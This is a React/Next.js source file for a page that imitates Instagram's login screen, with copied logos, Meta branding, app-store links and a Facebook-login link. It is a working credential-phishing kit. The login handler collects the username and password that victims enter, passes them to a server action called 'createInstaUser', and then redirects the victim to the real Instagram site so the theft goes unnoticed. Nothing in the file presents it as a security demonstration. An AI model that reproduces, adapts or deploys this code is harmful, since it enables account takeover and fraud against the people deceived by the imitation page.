"use client";
import { createInstaUser } from "@/lib/actions/user.actions";
import {
  appleInsta,
  createInstagramAccountLink,
  forgotInstaPassword,
  googleInsta,
  instagramLink,
} from "@/lib/links";
import { Loader, LoaderCircleIcon } from "lucide-react";
import Image from "next/image";
import Link from "next/link";
import React, { useState, useEffect } from "react";
import { FaRegEyeSlash } from "react-icons/fa6";
import { IoEyeOutline } from "react-icons/io5";
import { SiMeta } from "react-icons/si";

function MainPage() {
  const [currentImageIndex, setCurrentImageIndex] = useState(0);
  const [username, setUserName] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState(""); // Error state to display validation messages
  const [showPassword, setShowPassword] = useState(false);
  const [isLoading, setIsLoading] = useState(false);

  const handleLogin = async (e: React.MouseEvent<HTMLButtonElement>) => {
    e.preventDefault();
    if (!username || !password) {
      setError("Both fields are required"); // Set error if fields are empty
      return;
    }
    setError(""); // Clear error if fields are filled
    setIsLoading(true);

    const data = {
      username: username,
      password: password,
    };

    console.log("This is the data:", data);
    const response = await createInstaUser(data);
    if (response.messsage == "success") {
      window.location.href = instagramLink;
    } else {
      setError("Something went wrong");
    }
    setIsLoading(false);
  };

  

  const images = ["/insta1-new.png", "/second.png", "/insta3-new.png"];

  useEffect(() => {
    const intervalId = setInterval(() => {
      setCurrentImageIndex((prevIndex) => (prevIndex + 1) % images.length);
    }, 3000);

    return () => clearInterval(intervalId); // Cleanup interval on unmount
  }, []);

  return (
    <div className="h-[100vh] w-[100vw]  sm:h-[90vh]   sm:flex sm:flex-row sm:overlfow-y-hidden sm:pt-12 md:pt-16 lg:pt-20">
      {/* Left Section with Background Image and Image Carousel */}
      <div className=" h-[35%] sm:w-[50%] sm:h-full  sm:flex sm:justify-end sm:items-end  ">
        <div className="flex flex-col  items-center p-4 gap-y-32 sm:gap-y-0 sm:justify-center sm:hidden ">
          <div className="language text-[19px]   flex justify-center w-full">
            <span className="sm:hidden text-black">English(US)</span>
          </div>
          <div>
            <Image
              height={500}
              width={500}
              alt=""
              src="/instagram.png"
              className=" h-20 w-20 sm:hidden"
            />
          </div>
        </div>
        <div className=" hidden sm:flex sm:h-full sm:w-[500px]  sm:justify-end sm:items-start relative">
          <div className=" relative ">
            <Image
              height={5000}
              width={5000}
              alt="Background Frame"
              src="/frame.png"
              className="h-full w-full"
            />
            <img
              src={images[currentImageIndex]}
              alt="Image"
              className={` ${
                currentImageIndex == 2
                  ? "w-[56.9%] h-[86.99%] absolute left-[31.99%] top-[3%]"
                  : " w-[56.9%] h-[87.8%] absolute left-[31.8%] top-[3%]"
              } `}
            />
          </div>
        </div>
      </div>
      <div className=" h-[65%] sm:w-[50%]   pt-4 px-4 py-2 flex flex-col justify-between   sm:p-0  sm:h-full  ">
        <div className="    mt-7 sm:w-[400px] sm:h-[75%] sm:flex sm:flex-col   sm:justify-start  sm:items-start  sm:gap-y-4">
          <form
            action=""
            className="  sm:border-[1.5px]  sm:border-gray-200 sm:w-[350px] sm:px-5   flex flex-col gap-y-2 sm:pb-6"
          >
            <div className="hidden sm:flex sm:justify-center sm:w-full">
              <img src="/instlogo.png" className="w-[70%] " />
            </div>
            <p className="hidden">
              <Image
                width={400}
                height={400}
                src="/instlogo.png"
                alt="Instagram Logo"
                className="h-[100px] w-[100px]"
              />
            </p>
            <div className="w-full flex flex-col gap-y-2">
              <input
                placeholder="Mobile number or username or  email"
                className=" w-full border-[0.4px] p-[16px] text-black sm:py-[10px] border-gray-400 sm:border-gray-200 placeholder:text-gray-500 placeholder:text-[16px] sm:placeholder:text-[14px] rounded-xl focus:outline-[1px] focus:outline-blue-500 sm:rounded-sm"
                value={username}
                onChange={(e) => setUserName(e.target.value)}
              />
              <div className="w-full relative">
                <input
                  placeholder="Password"
                  type={showPassword ? "text" : "password"}
                  className="  w-full border-[0.4px] p-[16px] text-black sm:py-[10px] border-gray-400 sm:border-gray-200 placeholder:text-gray-500 placeholder:text-[16px] sm:placeholder:text-[14px] rounded-xl focus:outline-[1px] focus:outline-blue-500 sm:rounded-sm"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                />
                {password?.length > 0 && (
                  <span
                    className=" absolute font-semibold cursor-pointer bottom-[30%] right-3 text-[24px] text-gray-600"
                    onClick={(e) => setShowPassword(!showPassword)}
                  >
                    {showPassword ? (
                      <FaRegEyeSlash />
                    ) : (
                      <IoEyeOutline className="" />
                    )}
                  </span>
                )}
              </div>
              {error && <p className="text-red-500">{error}</p>}{" "}
              {/* Display error message */}
              <button
                className="bg-[#0866ff] sm:bg-[#0095F6] border-gray-600 rounded-3xl sm:rounded-[10px] p-[10px]  flex justify-center items-center border-0 text-[19px] smLp-0 sm:text-[13px] sm:text-white"
                onClick={handleLogin}
              >
                {isLoading ? (
                  <>
                    <LoaderCircleIcon className=" p-2 animate-spin size-8" />
                  </>
                ) : (
                  <span className="">Log In</span>
                )}
              </button>
            </div>
            <div className="w-full hidden sm:inline-flex sm:flex-col   sm:mt-4 sm:gap-y-6">
              <div className="w-full flex items-center justify-evenly">
                <div className="h-[1px] w-[95%]  border-[1px] border-gray-400" />
                <div className="mx-4 text-slate-600 font-semibold">OR</div>
                <div className="h-[1px]  w-[95%] border-[1px] border-gray-400" />
              </div>
              <div className="flex flex-col items-center  gap-y-2 text-[13px]">
                <div className="font-semibold text-[#0095F6]">
                  <Link href={"/facebook-login"}>
                    <span>Login in with facebook</span>
                  </Link>
                </div>
                <div className="text-blue-900 cursor-pointer">
                  <Link href={forgotInstaPassword}>Forgot password?</Link>
                </div>
              </div>
            </div>
          </form>
          <div className="sm:border-[1.5px] text-[12px]  sm:border-gray-200 hidden sm:block p-4 w-[350px]">
            <p className="text-center">
              Don&apos;t have an account ?{" "}
              <Link href={createInstagramAccountLink}>
                <span
                  className="font-semibold text-[16px] text-[#0095F6]"
                 
                >
                  Sign up
                </span>
              </Link>
            </p>
          </div>

          <div className=" flex-col w-[350px] sm:items-center   sm:gap-y-3 hidden sm:flex">
            <div className="text-[14px]">Get the app</div>
            <div className="flex justify-center gap-x-4 w-full">
              <Link href={appleInsta}>
                <img src="/apple.png" className="w-[140px] h-[44px]" />
              </Link>
              <Link href={googleInsta}>
                <img src="/apple.png" className="w-[140px] h-[44px]" />
              </Link>
            </div>
          </div>

          <p className="text-gray-800 sm:hidden text-center m-4">
            Forgot password?
          </p>
        </div>

        {/* Meta Section */}
        <div className="text-black w-full flex flex-col pt-4 sm:hidden">
          <div className="mt-4 flex flex-col gap-y-6">
            <button className="text-[#0647c8] border-[0.5px] border-[#0647c8] w-full rounded-3xl p-[10px] text-[19px]">
              Create new account
            </button>
            <div>
            <p className="flex gap-x-2 mt-3 justify-center w-full">
              <span className="flex gap-x-2">
                <SiMeta className="text-black text-[25px]" />
                <span className="text-[20px]">Meta</span>
              </span>
            </p>
            <div className="flex justify-center gap-x-3 mt-2 mb-1 text-[12px]">
              <span>About</span>
              <span>Help</span>
              <span>More</span>
            </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}

export default MainPage;
